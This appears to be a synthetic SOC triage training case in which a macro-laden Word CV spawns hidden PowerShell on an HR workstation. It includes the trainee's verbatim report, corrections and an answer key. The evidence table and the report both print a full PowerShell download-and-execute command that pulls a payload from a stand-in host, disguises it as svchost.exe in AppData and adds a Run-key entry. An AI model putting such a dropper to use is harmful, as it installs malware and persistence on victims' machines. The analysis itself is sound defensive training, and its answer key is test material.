# Case 2 — Word attachment spawns hidden PowerShell (W6-C2)

*Synthetic data. Answer key = scenario author's design.*

- **Alert:** EDR "Office Application Spawning Command Interpreter" (High)
- **Host / user:** HR-PC-03 (HR), user `hr.m`
- **When:** Monday 14:10–14:25. Mail gateway: external first-time sender `layla.hassan.cv@mail-example.test`, delivered 14:21:04 with an attachment

## Evidence
| Time | Source | Event |
|---|---|---|
| 14:10:22 | Sysmon 1 | Teams `Update.exe` (signed), parent `explorer.exe` — normal |
| 14:15:03 | Sysmon 1 | `svchost.exe -k netsvcs -p -s wuauserv` (signed), parent `services.exe`, SYSTEM — normal |
| 14:21:05 | Sysmon 11 | `OUTLOOK.EXE` creates `...\Content.Outlook\X7K2\CV_Layla_Hassan.docm` |
| 14:21:40 | Sysmon 1 | `WINWORD.EXE` (parent `OUTLOOK.EXE`) opens the file |
| 14:21:44 | Sysmon 1 | `cmd.exe /c powershell.exe -nop -w hidden -c "(New-Object Net.WebClient).DownloadFile('http://cdn-check.example.test/s.bin','C:\Users\hr.m\AppData\Roaming\Microsoft\Windows\svchost.exe'); Start-Process ..."` |
| 14:21:47 | Sysmon 1 | `...\AppData\Roaming\Microsoft\Windows\svchost.exe` (**unsigned**), parent `powershell.exe`, no `-k` |
| 14:21:50 | Sysmon 13 | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemHealth` → that file |
| 14:21:52–14:41 | Sysmon 3 | Connection to `198.51.100.23:443` about every 60 s, 20 times |

SIEM notes: no AV alert; file hash not checked; no new tasks/services; no SMB or internal lateral activity.

## IOCs (synthetic)
Sender `layla.hassan.cv@mail-example.test`; `CV_Layla_Hassan.docm`; `http://cdn-check.example.test/s.bin`; `C:\Users\hr.m\AppData\Roaming\Microsoft\Windows\svchost.exe`; `HKCU\...\Run\SystemHealth`; `198.51.100.23:443`.

## My original verdict
TP, high confidence. Understood the chain email → Word → cmd → PowerShell → file → Run key → connection.

## What was wrong / corrected
- Fake `svchost.exe` listed as the *weakest* evidence; it is among the strongest (unsigned, AppData, no `-k`, parent PowerShell).
- "Missing evidence" listed facts already present; real gaps: file hashes, macro content, destination reputation, other recipients of the email.
- Timeline copied from the case instead of written in own words; recommendation was cut short.
- "What would change my mind" first empty; revised to authorized phishing simulation / benign hashes (must be verifiable).

## Answer key
**TP, high confidence.** Parent–child chain + masqueraded unsigned binary in a user folder + persistence + regular beaconing.

## Lessons
Compare with the normal `svchost.exe` in the same case. Always list scope: other mailboxes, hosts with the same hash.

## Original report
*Verbatim as submitted (spelling errors kept). Whitespace normalized; long Base64 strings replaced with a marker. Evidence lines copied from the case are part of what I submitted.*

```
CASE ID:6w-C2
INITIAL ALERT: EDR «Office Application Spawning Command Interpreter» in the computer HR-pc-03 for the user hr.m  in 14:10
TIMELINE: in the 14:10:22. C:\Users\hr.m\AppData\Local\Microsoft\Teams\Update.exe (موقّع: Microsoft).  Parent: explorer.exe | User: hr.m.   14:15:03 —
• Image: C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv (موقّع: Microsoft Windows)
• Parent: C:\Windows\System32\services.exe | User: SYSTEM. (we do not have any suspicious in this two action ).
14:21:05.  OUTLOOK.exe  C:\Users\hr.m\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\X7K2\CV_Layla_Hassan.docm. in this action create a new file .  14:21:40 — Sysmon 1
• Image: WINWORD.EXE (Microsoft) | Parent: OUTLOOK.EXE | User: hr.m
• CommandLine:  open file CV_Layla_Hassan.docm  after that in the word.exe open cmd and execution the command(cmd.exe /c powershell.exe -nop -w hidden -c "(New-Object Net.WebClient).DownloadFile('http://cdn-check.example.test/s.bin','C:\Users\hr.m\AppData\Roaming\Microsoft\Windows\svchost.exe'); Start-Process 'C:\Users\hr.m\AppData\Roaming\Microsoft\Windows\svchost.exe'") and edit the registery key 14:21:50 KEY: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemHealth C:\Users\hr.m\AppData\Roaming\Microsoft\Windows\svchost.exe
PROCESS TREE / COMMAND LINE: can you see in the timeline up
PERSISTENCE: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemHealth
NETWORK:14:21:52 يتكرر كل دقيقة حتى 14:41 — Sysmon 3 (اتصال شبكة)
• العملية: svchost.exe أعلاه (من AppData)
لوجهة: .198.51.100.23.443 and connection each  60 sec for 20 times.
STRONGEST EVIDENCE :conected withe the ip  198.51.100.23:443 and hash the email,file and the word.exe to cmd.exe  when the user click the email. And the registery key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemHealth
WEAKEST EVIDENCE : C:\Users\hr.m\AppData\Roaming\Microsoft\Windows\svchost.exe
MISSING EVIDENCE: ues the cmd and use hidden,  nop and powershall
VERDICT: TP
CONFIDENCE :high.
RECOMMENDED RESPONSE : isolation the computer and chack if any user have the same email and check the
ENGLISH VERDICT : the attacker send the email the employer HR click the email and download the file(svchost.exe) the file extension (cmd.exe /c powershell.exe -nop -w hidden -c "(New-Object Net.WebClient).DownloadFile('http://cdn-check.example.test/s.bin','C:\Users\hr.m\AppData\Roaming\Microsoft\Windows\svchost.exe'); Start-Process 'C:\Users\hr.m\AppData\Roaming\Microsoft\Windows\svchost.exe'")word.exe and cmd.exe  powershall.exe and connection to the ip 198.51.100.23  and created  key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemHealth.
```

**Follow-up note (my words, translated):** "WHAT WOULD CHANGE MY MIND: nothing came to mind, except ideas like it being a training exercise, a machine used to test emails, or an employee from outside the company testing a breach." I also noted I did this one quickly because I had forgotten I had not done it.

